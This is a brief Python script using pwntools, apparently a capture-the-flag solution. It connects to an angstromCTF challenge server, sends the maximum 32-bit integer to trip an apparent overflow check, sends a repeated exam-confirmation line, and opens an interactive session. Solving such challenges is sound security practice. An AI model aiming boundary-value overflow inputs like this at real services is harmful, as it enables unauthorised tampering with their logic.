from pwn import *
r = remote('challs.actf.co', 31322)
r.sendline(f'2147483647')
for _ in range(2): r.sendline(b'I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.')
r.interactive()
